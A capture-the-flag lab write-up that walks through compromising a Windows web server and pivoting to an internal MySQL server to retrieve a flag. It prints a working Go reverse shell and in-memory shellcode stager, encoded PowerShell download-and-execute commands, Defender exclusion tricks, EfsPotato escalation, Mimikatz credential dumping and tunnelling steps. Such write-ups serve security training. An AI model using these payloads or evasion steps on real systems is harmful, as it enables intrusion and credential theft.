# Staged | Writeups

Objective / Scope

You are a member of the **Hack Smarter Red Team** and have been assigned to perform a black-box penetration test against a client's critical infrastructure. The scope is strictly limited to the following hostnames:

* **web.hacksmarter:** Public-facing Windows Web Server (Initial Access Point). **Windows Defender is enabled.**
* **sqlsrv.hacksmarter:** Internal Linux MySQL Database Server.

The exercise is considered **complete** upon successfully retrieval the final flag from `sqlsrv.hacksmarter`

Any activity outside of these two hosts or their associated network interfaces is strictly prohibited.

**Lab Starting Point**

During the beginning of the engagement, another operator exploited a file upload vulnerability, and they have provided you with a web shell.

`http://web.hacksmarter/hacksmarter/shell.php?cmd=whoami`

###

Summary

Summary - NonSliverC2 Approach

In Staged we begin with a pre-established web shell on a public-facing Windows server and weaponize it to deploy an undetected Go-based reverse shell, establishing stable command execution as `j.smith`. Enumerating privileges reveals `SeImpersonatePrivilege`, enabling exploitation through EfsPotato to escalate to `NT AUTHORITY\SYSTEM`. With full system privileges, we bypass Windows Defender restrictions, execute Mimikatz, and extract NTLM hashes for multiple users, successfully cracking credentials for `p.richardson`. To pivot into the internal network, we deploy Ligolo-ng to tunnel traffic through the compromised web server and access the internal MySQL server. Authenticating as `p.richardson`, we enumerate the `hacksmart_db` database and retrieve the final flag from the `final_config` table, completing full compromise of the target environment through privilege escalation, credential extraction, and network pivoting.

###

Recon

We use rustscan `-b 500 -a web.hacksmarter -- -sC -sV -Pn` to enumerate all TCP ports on the target machine, piping the discovered results into Nmap which runs default NSE scripts `-sC`, service and version detection `-sV`, and treats the host as online without ICMP echo `-Pn`.

A batch size of `500` trades speed for stability, the default `1500` balances both, while much larger sizes increase throughput but risk missed responses and instability.

Copy

```
 rustscan -b 500 -a web.hacksmarter -- -sC -sV -Pn
```

![](<../../../.gitbook/assets/image (199)>)

Among the open ports, we have ports `80`, `443`, and `3389`.

![](<../../../.gitbook/assets/image (200)>)

We run rustscan on `sqlsrv.hacksmarter` with `-b 500 -a sqlserver.hacksmarter -- -sC -sV -Pn` too to enumerate all TCP ports on the target machine, piping the discovered results into Nmap which runs default NSE scripts `-sC`, service and version detection `-sV`, and treats the host as online without ICMP echo `-Pn`.

A batch size of `500` trades speed for stability, the default `1500` balances both, while much larger sizes increase throughput but risk missed responses and instability.

But only have port 22 available asdescribed in the scenario.

Copy

```
rustscan -b 500 -a sqlsrv.hacksmarter -- -sC -sV -Pn
```

![](<../../../.gitbook/assets/image (208)>)

###

Non-SliverC2 Approach

####

Shell as j.smith on web.hacksmarter

As described in the scenario we already have a web shell available at `http://web.hacksmarter/hacksmarter/shell.php?cmd=`. We test these and have access as `j.smith`.

Copy

```
curl 'http://web.hacksmarter/hacksmarter/shell.php?cmd=whoami'
```

![](<../../../.gitbook/assets/image (214)>)

We know from the scenario that Windows Defender is active. For a more interactive shell, we use our go reverse shell, which has remained undetected so far.

0xb0b.go

Copy

```
package main

import (
    "net"
    "os/exec"
)

func main() {
    c, _ := net.Dial("tcp", "10.200.24.50:443")
    cmd := exec.Command("powershell")
    cmd.Stdin = c
    cmd.Stdout = c
    cmd.Stderr = c
    cmd.Run()
}
```

We compile the reverse shell as follows on our Exegol instance:

Copy

```
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -o 0xb0b.exe 0xb0b.go
```

![](<../../../.gitbook/assets/image (217)>)

Next, we run a listener to catch the reverse shell. For this purpose we use Penelope:

[![Logo](<../../../.gitbook/assets/image (264)>)GitHub - brightio/penelope: Penelope Shell HandlerGitHub](https://github.com/brightio/penelope)

Copy

```
penelope -p 443
```

![](<../../../.gitbook/assets/image (265)>)

Next, we prepare a Powershell payload that downloads our reverse shell from our web server and then executes it. We encode this payload so that we don't encounter any problems with the web shell during execution with regard to special characters, etc.

Copy

```
printf '%s' 'IWR http://10.200.24.50/0xb0b.exe -OutFile $env:TEMP\0xb0b.exe; Start-Process $env:TEMP\0xb0b.exe' \
| iconv -f UTF-8 -t UTF-16LE \
| base64 -w 0
```

We'll receive the following base64 encoded command.

Copy

```
SQBXAFIAIABoAHQAdABwADoALwAvADEAMAAuADIAMAAwAC4AMgA0AC4ANQAwAC8AMAB4AGIAMABiAC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAGUAbgB2ADoAVABFAE0AUABcADAAeABiADAAYgAuAGUAeABlADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABlAG4AdgA6AFQARQBNAFAAXAAwAHgAYgAwAGIALgBlAHgAZQA=
```

Next, we run a python web server.

Copy

```
python -m http.server 80
```

With the web server and Penelope listener prepared, we execute the payload.

Copy

{% code overflow="wrap" %}
```
curl 'http://web.hacksmarter/hacksmarter/shell.php?cmd=powershell.exe+-e+SQBXAFIAIABoAHQAdABwADoALwAvADEAMAAuADIAMAAwAC4AMgA0AC4ANQAwAC8AMAB4AGIAMABiAC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAGUAbgB2ADoAVABFAE0AUABcADAAeABiADAAYgAuAGUAeABlADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABlAG4AdgA6AFQARQBNAFAAXAAwAHgAYgAwAGIALgBlAHgAZQA='
```
{% endcode %}

![](<../../../.gitbook/assets/image (266)>)

The reverse shell gets downloaded,...

![](<../../../.gitbook/assets/image (267)>)

..., and we receive a connection back to our listener.

![](<../../../.gitbook/assets/image (268)>)

####

Shell as NT AUTHORITY/SYSTEM on web.hacksmarter

We check which privileges are set for the user and see that `SeImpersonatePrivilege` is enabled.

The `SeImpersonatePrivilege` is a powerful Windows privilege that allows a user or process to impersonate another user's security context. There are several potato exploits for this.

![](<../../../.gitbook/assets/image (269)>)

Since the AV is very strict, we try the EfsPotato exploit. This needs to be compiled on the target system.

[![Logo](<../../../.gitbook/assets/image (264)>)GitHub - zcgonvh/EfsPotato: Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).GitHub](https://github.com/zcgonvh/EfsPotato)

We look for a `csc` compiler on the machine at `C:\Windows\Microsoft.Net\Framework\`...

Copy

```
ls C:\Windows\Microsoft.Net\Framework\
```

![](<../../../.gitbook/assets/image (270)>)

... and have one ready at:

Copy

```
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe
```

We download the source of the EfsPotato exploit.

Copy

```
curl http://10.200.24.50/EfsPotato.cs -o ./EfsPotato.cs
```

To compile the binary we issue the following command like suggested in the repository.

Copy

```
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe /platform:x86 EfsPotato.cs -nowarn:1691,618
```

![](<../../../.gitbook/assets/image (271)>)

Next, we want to use the exploit to run our reverse shell in the context of NT AUTHORITY/SYSTEM. The binary is located in `C:\Users\j.smith\AppData\Local\Temp\0xb0b.exe`

![](<../../../.gitbook/assets/image (272)>)

We issue the following command to execute the reverse shell binary in the context of NT Authority System.

Since we use Penelope, we don't have to go to the trouble of creating, uploading, and executing a new reverse shell with a different port and a different listener. The Penelope listener recognizes a new connection on the same port and automatically creates a new session. In this case, `session 2`. Using `CTRL+D`, we detach our session and switch to session 2 using the `session` command. We are now NT AUTHORITY/SYSTEM.

Copy

```
.\EfsPotato.exe "cmd.exe /C C:\Users\j.smith\AppData\Local\Temp\0xb0b.exe"
```

![](<../../../.gitbook/assets/image (273)>)

From our initial enumeration, we find not only `j.smith` but also users `b.morgan` and `p.richardson`.

![](<../../../.gitbook/assets/image (274)>)

Since we are NT Authority System we try to run Mimikatz to extract all available credentials from the LSASS memory. Defender is enabled, so the execution of Mimikatz gets prevented and the file deleted. We try to disable the `RealtimeMonitoring`, but without success.

Copy

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

But setting an exception path seems to work.

Copy

```
Add-MpPreference -ExclusionPath C:\Users\j.smith
```

Next, we download and execute Mimikatz.

Copy

```
curl http://10.200.24.50/mimikatz.exe -o ./mimikatz.exe
```

Copy

```
./mimikatz.exe
```

We elevate privileges to SYSTEM level and...

Copy

```
privilege::debug
```

... try to extract all available credentials from LSASS memory. We are able to retrieve the NTLM hashes of `p.richardson` and `j.smith`

Copy

```
sekurlsa::logonpasswords
```

A clear cheat sheet for Mimikatz can be found here:

[![Logo](<../../../.gitbook/assets/image (275)>)Mimikatz | Hackviserhackviser.com](https://hackviser.com/tactics/tools/mimikatz)

![](<../../../.gitbook/assets/image (276)>)

We try to crack the NTLM hashes and are successful for the user `p.richardson`.

Copy

```
hashcat -a0 -m 1000 'REDACTED' /usr/share/wordlists/rockyou.txt --show
```

![](<../../../.gitbook/assets/image (277)>)

Now that we have a username and password, we can try to access the SQL Server. Since we are restricted by segmentation and may not be able to reach all services of the `sqlsrv.hacksmarter` machine from our attacker machine, we set up a tunnel using Ligolo.

####

Ligolo-ng Setup

For the subsequent phases, we use Ligolo to relay traffic between the target machine and our attacker machine to make the internal reachable networks of the target machine accessible to our attacker machine.

> **Ligolo-ng** is a _simple_, _lightweight_ and _fast_ tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a **tun interface** (without the need of SOCKS).

First, we start the proxy server and set up a TUN (network tunnel) interface called `staged` and configuring routes to forward traffic for specific IP ranges (`240.0.0.1`, `10.0.18.213/32`) through the tunnel.

Copy

```
sudo ./proxy -selfcert
```

Copy

```
ifcreate --name staged
```

Copy

```
route_add --name staged --route 240.0.0.1/32
```

Copy

```
route_add --name staged --route 10.0.18.213/32
```

![](<../../../.gitbook/assets/image (278)>)

Next, we download and run the agent on the target machine.

Copy

```
curl http://10.200.24.50/agent.exe -o ./agent.exe
```

Copy

```
./agent -connect 10.200.24.50:11601 --ignore-cert
```

![](<../../../.gitbook/assets/image (279)>)

We get a message on our Ligolo-ng proxy that an agent has joined. We use `session` to select the session and then `tunnel_start --tun staged` to run the tunnel. We are now able to to reach out to `10.0.18.213/32` fully.

Copy

```
session
```

Copy

```
tunnel_start --tun staged
```

![](<../../../.gitbook/assets/image (280)>)

####

Recon on sqlsrv.hacksmarter

We rerun our rustscan and are able to detect the open port `3306`.

Copy

```
rustscan -b 500 -a sqlsrv.hacksmarter -- -sC -sV -Pn
```

![](<../../../.gitbook/assets/image (281)>)

![](<../../../.gitbook/assets/image (282)>)

####

Access as p.richardson on sqlsrv.hacksmarter

We try to connect to the sql service using the credentials found before and gain access.

Copy

```
mysql -h sqlsrv.hacksmarter -u p.richardson -p
```

The database enumeration reveals `hacksmart_db`, containing the `final_config` table where the final flag is stored.

Copy

```
select * from final_config;
```

![](<../../../.gitbook/assets/image (283)>)

###

SliverC2 Approach

The following section describes an approach using SliverC2. Here, we will use a custom stager, which is a modification of the nim stager from the SliverC2 course [https://www.hacksmarter.org/courses/dcb55e7c-6205-4ad2-92b7-7c8fcd71faad](https://www.hacksmarter.org/courses/dcb55e7c-6205-4ad2-92b7-7c8fcd71faad) of Tyler Ramsbey and is written in Go instead. Using this stager, we want to initially bypass detection by the Defender because it leverages a lesser-known programming language. Furthermore it executes the payload directly from memory to evade file-based and behavioral analysis. From the gained session we try to use the SliverC2 Framework with all its possibilities. I am still learning SliverC2 myself and cannot guarantee the most elegant, evasive solution.

####

Shell as j.smith on web.hacksmarter



Prepare a custom stager

First we need to prepare the stager.

The stager fetches raw shellcode from a chosen url and loads it directly into memory as bytes. The payload is not embedded in the binary, allowing it to be changed without recompiling.

It calls `VirtualAlloc` to reserve and commit memory with execute, read, and write permissions, then copies the downloaded shellcode into that memory using unsafe pointer operations.

The execution is transferred to the allocated memory address using `syscall.Syscall`, handing control to the shellcode.

stager.go

Copy

```
// +build windows

package main

import (
	"io"
	"net/http"
	"syscall"
	"unsafe"
)

var (
	kernel32            = syscall.NewLazyDLL("kernel32.dll")
	procVirtualAlloc    = kernel32.NewProc("VirtualAlloc")
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

func downloadShellcode(url string) ([]byte, error) {
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	return io.ReadAll(resp.Body)
}

func executeShellcode(shellcode []byte) {
	addr, _, err := procVirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		panic(err)
	}

	// Copy shellcode into allocated memory
	for i := 0; i < len(shellcode); i++ {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = shellcode[i]
	}

	// Execute shellcode
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func main() {
	url := "http://10.200.24.50/shellc.bin"

	shellcode, err := downloadShellcode(url)
	if err != nil {
		panic(err)
	}

	executeShellcode(shellcode)
}
```

Show all 62 lines

We compile the stager as follows on our exegol instance:

Copy

```
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -o stager.exe stager.go
```

![](<../../../.gitbook/assets/image (284)>)



Generate shell code

During generation without the `-G` tag, which disables the encoder, no shellcode could be successfully generated. The resulting shellcode was always empty. This may be related to the underlying architecture on which I am operating, namely ARM:

[https://github.com/BishopFox/sliver/issues/1114](https://github.com/BishopFox/sliver/issues/1114)

Next, we need to generate the shell code. We do this as follows:

Copy

```
generate --mtls 10.200.24.50:443 --os windows --arch amd64 --format shellcode -G --save /workspace/hacksmarter/staged/shellc.bin
```

![](<../../../.gitbook/assets/image (285)>)



Setup listener

We set up the listener.

Copy

```
mtls --lhost 10.200.24.50 --lport 443
```

![](<../../../.gitbook/assets/image (286)>)



Run web server

And run a web server from which the stager and the shellcode can be fetched.

Copy

```
python3 -m http.server 80  
```

![](<../../../.gitbook/assets/image (287)>)



Download and execute stager

As before, we prepare the payload for downloading and executing the stager. We encode this payload so that we don't encounter any problems with the web shell during execution with regard to special characters, etc.

Copy

```
printf '%s' 'IWR http://10.200.24.50/stager.exe -OutFile $env:TEMP\stager.exe; Start-Process $env:TEMP\stager.exe' \
| iconv -f UTF-8 -t UTF-16LE \
| base64 -w 0
```

![](<../../../.gitbook/assets/image (288)>)

We'll receive the following base64 encoded command.

Copy

```
SQBXAFIAIABoAHQAdABwADoALwAvADEAMAAuADIAMAAwAC4AMgA0AC4ANQAwAC8AcwB0AGEAZwBlAHIALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZQBuAHYAOgBUAEUATQBQAFwAcwB0AGEAZwBlAHIALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAZQBuAHYAOgBUAEUATQBQAFwAcwB0AGEAZwBlAHIALgBlAHgAZQA=
```

With the web server prepared, we execute the payload.

Copy

```
curl 'http://web.hacksmarter/hacksmarter/shell.php?cmd=powershell.exe+-e+SQBXAFIAIABoAHQAdABwADoALwAvADEAMAAuADIAMAAwAC4AMgA0AC4ANQAwAC8AcwB0AGEAZwBlAHIALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZQBuAHYAOgBUAEUATQBQAFwAcwB0AGEAZwBlAHIALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAZQBuAHYAOgBUAEUATQBQAFwAcwB0AGEAZwBlAHIALgBlAHgAZQA='
```

![](<../../../.gitbook/assets/image (289)>)

We see that the stager and the shellcode gets downloaded...

![](<../../../.gitbook/assets/image (290)>)

... and executed. We receive a session in SliverC2.

Copy

```
sessions
```

Copy

```
sessions -i b7036489
```

![](<../../../.gitbook/assets/image (291)>)

Without spawning a shell we can retrieve the current user and the privileges. We have `SeImpersonatePrivilege` enabled.

Copy

```
whoami
```

Copy

```
getprivs
```

![](<../../../.gitbook/assets/image (292)>)

####

Shell as NT AUTHORITY/SYSTEM on web.hacksmarter

Unfortunately, I couldn't find a tool in Armory that conveniently uses this privilege, so I used the same approach as before with EfsPotato.

[![Logo](<../../../.gitbook/assets/image (264)>)GitHub - zcgonvh/EfsPotato: Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).GitHub](https://github.com/zcgonvh/EfsPotato)

We upload the source...

Copy

```
upload EfsPotato.cs
```

![](<../../../.gitbook/assets/image (293)>)

... and compile the exploit

Copy

```
execute cmd.exe -- /c "C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe /platform:x86 /out:C:\xampp\htdocs\hacksmarter\EfsPotato.exe C:\xampp\htdocs\hacksmarter\EfsPotato.cs"
```

![](<../../../.gitbook/assets/image (294)>)

Next, we use the EfsPotato exploit to run our stager as `NT AUTHORITY SYSTEM`. We receive a session.

Copy

```
execute EfsPotato.exe "cmd.exe /C C:\Users\j.smith\AppData\Local\Temp\stager.exe"
```

Copy

```
sessions -i ed9842b0
```

![](<../../../.gitbook/assets/image (295)>)

Inside that session we can run mimikatz, a tool downloaded using armory. Although Defender is active, we can use this, but it kills our session after execution. Still, it's enough to harvest valuable credentials.

Copy

```
mimikatz -- sekurlsa::logonpasswords
```

![](<../../../.gitbook/assets/image (296)>)

![](<../../../.gitbook/assets/image (297)>)

We try to crack the NTLM hashes and are successful for the user `p.richardson`.

Copy

```
hashcat -a0 -m 1000 'REDACTED' /usr/share/wordlists/rockyou.txt --show
```

![](<../../../.gitbook/assets/image (298)>)

Now that we have a username and password, we can try to access the SQL Server.

####

Access as p.richardson on sqlsrv.hacksmarter

Instead of setting up Ligolo-ng we issue `socks5 start` to launch a local SOCKS5 proxy that tunnels traffic through our active session.

Copy

```
socks5 start
```

![](<../../../.gitbook/assets/image (299)>)

![](<../../../.gitbook/assets/image (300)>)

Next, we can use proxychains to reach out to `sqlsrv.hacksmarter`.

Copy

```
proxychains nmap -sT -Pn -n -p 22,3306 sqlsrv.hacksmarter
```

![](<../../../.gitbook/assets/image (301)>)

Via proxychains we are now able to connect to the SQL service on port 3306 with the credentials of `p.richardson` and find the final flag.

Copy

```
proxychains -q mysql -h sqlsrv.hacksmarter -u p.richardson -p
```

![](<../../../.gitbook/assets/image (302)>)

[PreviousPolution](https://0xb0b.gitbook.io/writeups/hack-smarter-labs/2025/polution)[NextStatic](https://0xb0b.gitbook.io/writeups/hack-smarter-labs/2025/static)

Last updated 6 months ago

Was this helpful?
